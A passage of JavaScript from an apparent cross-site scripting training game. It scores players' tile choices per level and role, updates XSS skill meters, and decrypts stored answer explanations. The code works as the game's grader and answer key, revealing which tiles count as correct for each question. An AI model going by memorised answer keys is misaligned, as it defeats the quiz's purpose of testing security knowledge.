        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19DQxEr0eZqerRXKc8Nt4UFuC9SaBjKjxGTAG74cg2MOtcgkyh6DlSjQDgW3ueGDPGC5yXFTLLmSojjk9nUySTc76hhn3W7ahkjmsRkLx+lNIQfVPfdkNNA+m24aGcbR1He6noEf074fsctSrzPVEOdrBascoslbX7fdSfvW5TF5kg1/fZHtFMnkNE6xNJ7Hp2MjxbJ3kOnRMhtZ1gM3wAtTqcSZh5g/OPP9Cpm9BXPn0Pe5T+9NzJR19086YsK0754eMasfG5TEZ0gq0ifWC6KKcQKsr6aAxJ1kzt7pHwAqqKtO2aRfi8ewFKkEEK33RvWZhhp/6chmigsW2exMqF+5t3IFKawfDrxmlMpT09ehXAbZ/Rd+yeT6vfpcA6Z1Y89XJbNAsBI72ArJEwXp7o28hJS8htghEMIreRbatEiU4UOc85pYHMwjO5LbAe4MtkmDV118428lm9Pffvp6jp+y1d3J1/ogtxIS3Aqfs5Ur0hupwy0UKM+ymISuAijg+ferJYBmLioeyya4Vrme8aNBAa+5NlrTTsh3y7lMZdcPkQH6HP5YXOlXxq9G26XqkG5FFWng6MNX5SS8DBRrKjMRedGYmaAZkLgMtCrljgnyzsH2PNVa9OjmYLQ89VVQ9mdJGp5ZV08dPKOBJUoQasqu3IGsXVns6BqmV3kKja6+bWSdmZ5RN7FvuYpqqGoZZumbDb738/NNkwiVPOrX3whXDS3cQuQz2ubHygfoyCEcIH4XaWrBmwxcfm4JnJpGQneggj3ZTrawKlUt1TVhVLm+/5s6ccLL8a44TZD0I4BAfnHX6lS45vX6jiJ8AWP22xSid+zr/NCOA==", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/ECPuONM/BLqKrnP3b+OG5LOjNKslwsHrnJnslw2KlEEH2RklT9A0b", gameStatus).toString(CryptoJS.enc.Utf8) + +String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+7cvD9xmeNCILUvysKNga/f/HZs43t/UAe/hzIHLZJjlnuGj4JGIZ3dK/wFZFWmp61H7y5eFD4Et5ADg0I4EfegZWpznoZBAp2wUYoLsFD0+ENrZw4z7vXTwyPzIvNJDjjaTmWp5YAn/+8OgEwzbWiANQkop1m0/M3PukAHDUD5niyudN6C3YD1gpib7b+EO1eFhwNCTqFHYcWJjeQD0cYmpe4fjd5kms+cG/VsbXWELjjKkyBiKmhm9seTgd5TVpebMmfbTJw6vMTvgVhs5RhM4shywVlFstE2UE45V2qq6clDFuEPu9k5GbM2DCBv/YqeNwBMIe86gJHGcddMZ8n82G6mDHo7CurJu4eW3vKe7RP/UCii+R0", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:1,Level:6");
        currentLevelNo = 100;
        clearInterval(timerInterval);

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L6Q1A1");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            DefenderStoredSkillsValue = DefenderStoredSkillsValue + defenderStoredOffset;
            DefenderReflectedSkillsValue = DefenderReflectedSkillsValue + defenderRefOffset;
            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue + defenderDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctDefenderAnswersList.push("R1L6Q1A4");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectDefenderAnswersList.push("R1L6Q1A2");

            DefenderDOMBasedSkillsValue = DefenderDOMBasedSkillsValue - 2;

            if (DefenderDOMBasedSkillsValue < 0) {
                DefenderDOMBasedSkillsValue = 0;
            }


            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }

        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            incorrectDefenderAnswersList.push("R1L6Q1A3");
            if (!suggestedRoleList.includes("Defender")) {
                suggestedRoleList.push("Defender");
            }

        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;

        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R1L6");

        completionTime = timeLimitInSeconds;
        rolesPlayed.push("Defender");
        LastPlayedRole = "Defender";




    } else if (roleId == 2 && (currentLevelNo == 1 || currentLevelNo == 200)) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/N2QDnR/r6ckptEE5eDfBUATsguxxtA4lbvVLzW3d1+Yig4OdlhSv9", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1821cprkgPPG9cNEhf5mVlduURnBwmInQsF/bYh6O+P1CqALRWO0xT5Q1VHr3xtaXdLGCqQB7TXz+9wCjJnQzakExPOVnZaQr18RWxET5wJDE/fzygw0PCQHO5qTBVgBKJSLz+XZmr6sXNyqHcmdYxXXgTLICcjA3DNiQSOkQJ9BtD/63JSjyHe3YV54BovZBV2X24qHM+eAD3xO2knNPKHLKtHUfaM8EJAWXYEGATclI40t4kndY1y", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX187j1p5u6y59k8oV7Z8smYQZ7ooG9KLH08B+or1DmAFV9KdSGoVD7BB", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+7ZNlRsX4w7BSbKJR/e9lRyCwTV14HTOKxCDv7u3PIxAyCkCrnzhT+3TrN9knMuefUS0ln/3EYpngylLmRonVMgB9fPU/2gFE6FlWgiW2aKy7mifv1Wg8O2NJK9/xySHZV9wAvlqtqyvezKjthehVUXxtGQ0RQpx8AsFw8ieVxRyHmddUS0BlWz7LMZ/nTbuE2qScKDmUgUgncCAFKRO2AFAycR4+Fxr8+oVa6y54Du24GRIEzKtfVg9wLn2imJblZ9+pnjZ0c6r8ksVk5SBNwjZnyh7qf4fKp3tk98yBKMJ+b7DVlXPVnZFHIa/DJi3DrAFWOxxkr+9v7m5aX4VPweytzwXqbnHKU3SzVMPrZ5VmTSjkDzbIdTe+QVsTs7MkX0csYIL5QvJ2IJJifUCdQOHvVf3odq3M=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:2,Level:1");
        currentLevelNo = 2;
        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L1Q1A3");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L1Q1A4");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectUserAnswersList.push("R2L1Q1A1");

            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }

            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectUserAnswersList.push("R2L1Q1A2");

            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;


        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R2L1");
    } else if (roleId == 2 && currentLevelNo == 2) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+m6D1ptsuIFJjJsCmwUOP9u7t0erOwk0QVLM4QAdUCiF/lTteLpYkT", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[2]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19WLQB0PSp24sUQGw50g5NGUPJNEM1EPGmsTS7sTIJaj3EfGJUKiGcOC/rviLsXhholHbF0RRAcwq0cXKT3STp2KB9xgHweH7H3ezFUQGS+SWS9qa5JAEq2Xi2VVsWuP4WbU3fX+VnHJh0KwL/3tRK6FxWgzjRB0Jk9RLdaXuU6ndT/JpOFF8WMt26RNBfxf3f0KiBK0YvMRxwqY6dYSonA10zZGSTkHA5zXI4C9zYJBRDUACd+Xi/CD9K3HYvvgGpfpCfju+sB64cj+RhQqYHfEbJyMLCbKcINwItbm17P+YdYLowYB2qv78I614IiRLwQ1RLIyP/zWyUafRX1m7As/b1DCLJI9WRNBfcjpjcsMWCf1Iaau7SGx2A1VaeM+Gonh/KCJdYkkR+wfR0+eiq4m1+B5NWjksktKK8pfKpIm725OiuUS/Lz", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX18tYDvzzvM1MXeM0PSWzrMacMnLV4keLJvIAiFl6K7Io/UDh71qUBVv", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[1]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+4N5iVYM7SPUso63PyRuwsCrJu3OdurllcKcEgVovqZQUDIEZpPVloY8ymZIZxz3qmMjwn44aCxZpQNEj08pIa9AOlRBvBKVJ6zcZ08WEj7KWd7C+hRHhshmZvYbUNpjRClNCsK923tx2GmUM4Ig01mrdhg19m4nJxUvQl7KCKrdNb09PlyNVqYi+J5OvXdO+mxoj61MXjuq0cCoHeVsJscoJOrt+Eifw0AcK1jEQH4ZhbSTeVXrf7E3ZL9mQ5Tx+5EL8bgkQKDos+2LskLczDFyUlArQA1GNBxoUWdTH+Zv+ft171h2lmRkmtzTYkBIvfWXXP3EvnV5f371Z3FE4lhuWY/ecnQvQ=", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:2,Level:2");
        currentLevelNo = 3;
        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L2Q1A3");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L2Q1A4");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectUserAnswersList.push("R2L2Q1A1");
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }

            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }


            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectUserAnswersList.push("R2L2Q1A2");

            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R2L2");
    } else if (roleId == 2 && currentLevelNo == 3) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19T18udsMTnuWqELCWMHUQPFBEIhfWeov5t378PPv7RmRfigD254VHE", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19vsnmmoHIE7Zv1ZQSWY62xCMyvFxCNKwhMI4NmUfvXq3VDEPeDbDMKPJXLorhyaujz32bf2ce8V2DUD1a/4gWsJhZI1Q06oH9w13Nqz95srzZd2khMXJb4SgrPCHmh7xu+ZWgsxo7ctvKrRLmCiHW7Z4cGGa74zXXJtdDxlgG3sRLxhYO5nrRZRECvpnDxgOL46G7QGKRsLLau5HQYzFaaGg3xJGtpMQSr7wANR6f5W7gag4Mg7HsM8kt1qm5senIg7A62/37BSpKbJWTtCD2ShxopQLV/LZ8bX6ETXodE0sD0z0xE5yBznHGUAlda+d6X5UGpa/BFAFgaLLx3kgnbxxF2idGxD5k/rZujt10BBfmvQF0WIOFVjHspON++MwFK0jYYIoiSRyKyEr02p3+ClK43ydz1K4Wp7kfT7v7UmZUhOIcnr1iRU7MGc1eESx6WAKst2Ha7cwO/PI5fHiRqRsT7L7mWH58=", gameStatus).toString(CryptoJS.enc.Utf8);
        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+qQuqXSDDScezeuonQE36yC0lZMiANUGTzngf3avR15S2zU/LdskSd", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1/RADQW00ElJFwQejrH31Cw+Mjafp+pwdJvLmdhvwk9FsrBzmA2Cb/ZnVxw7eJJl6ty4z6jo8OBmMYowKUH3Vs5OgNbNA7+FY66OlJ51uOqdEPl1lF9V0PVoXVg2AUXrDIEIv7xqmKWbQxvaewUUMKoLH9EERvAtPmnIyyDx/hXtvz5zhx8oqCX", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:2,Level:3");
        currentLevelNo = 4;
        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L3Q1A2");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L3Q1A3");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            incorrectUserAnswersList.push("R2L3Q1A1");

            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }

            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }


            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            incorrectUserAnswersList.push("R2L3Q1A4");

            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R2L3");

    } else if (roleId == 2 && currentLevelNo == 4) {
        document.getElementById("ANSRTXT3").style.color = "red";
        document.getElementById("ANSRTXT1").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19Xwi4DXP/3AWhZfF5yLg+xsHORk5nXIxjdcf+rYCyA4vbdik1W1izw", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[0]) + ',' + String(tileLocations[3]) + '.';
        document.getElementById("ANSRTXT2").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX19dv4ZuQJ0/xv05KzIpe816a6Z+BmuM0Cm1/qNvGgnFMSNORVGIx+fnnd+zJMNAlFoQFRvJ6OK6mar7tNvAadMKTomHlmFWNngyesup74B+ceMKkoBrUPEABEWE+VI4vN3Rdi5D8CrU2+kkRSN1QDxBcQgjiYV+fU/vOC3FhHonrphcx5qF2mf/1C8sTvyZs6F5lIlSd+LOj1KzNdnTYV9gKmZrcvKLJhBdF6vw8eis2NWiofo68Grf3GOdXhDpaQHgrrWw36ru+/nynPADQvABSwX6TKBlFLzBVsNoa4I+Y3FqWADKi/w1LG/7RRajxdx4znEZGVRSJfG83upQA4LwZFmhCzg7NtWg/4hwy3MQfxVIuVBikPJq+fWWMPgPjovAgkq5sTNaGtch09is3ZKYw6VGH7siDfB5GhWwn4hXOkqGc+vacwxYvqK5duPGQf+zm1Ha5YM6vgOeTG4zZrVcGCpHHVXpcKW4OYraPFgrUkwfGHJ6Zk8rQf4iD73vRyLrAfXkpFtucbHn7kMM22w1kVP0sr5RmRJfeKbZGDG8MeDW1o/tWkQ7", gameStatus).toString(CryptoJS.enc.Utf8);
